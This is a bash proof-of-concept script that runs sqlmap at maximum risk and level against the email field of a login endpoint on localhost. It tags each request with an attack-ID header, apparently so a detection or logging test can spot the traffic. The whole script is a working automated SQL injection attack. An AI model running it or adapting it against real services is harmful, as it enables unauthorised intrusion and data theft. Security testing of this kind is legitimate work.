#!/usr/bin/env bash
# poc_sqli.sh
# Simulates a basic SQL Injection attack against a JSON endpoint.
# Usage: ./poc_sqli.sh

# --- Configuration ---
API_GATEWAY_URL="http://localhost:8080" 
API_ENDPOINT="/api/auth/login"
ATTACK_ID="POC-SQLI-001"
REQ_FILE="sqli_request.txt"

# --- Script ---
if ! command -v sqlmap &> /dev/null
then
    echo "Error: sqlmap could not be found."
    echo "Please install it (e.g., 'sudo apt install sqlmap') and try again."
    exit 1
fi

echo "Creating sample request file: $REQ_FILE"
cat > $REQ_FILE <<EOF
POST ${API_ENDPOINT} HTTP/1.1
Host: localhost:8080
X-ATTACK-ID: ${ATTACK_ID}
User-Agent: poc-sqli-agent
Content-Type: application/json
Accept: */*

{"email":"test@example.com","password":"fakepassword"}
EOF

echo "Starting SQL Injection simulation with sqlmap..."
echo "Attack ID: $ATTACK_ID"

# The backslash '\' at the end of each line tells the shell that 
# the command continues on the next line.
sqlmap -r $REQ_FILE \
  -p "email" \
  --risk=3 \
  --level=5 \
  --ignore-code=401 \
  --batch

echo "SQL Injection simulation finished."
rm $REQ_FILE
echo "Cleaned up temporary file. Done."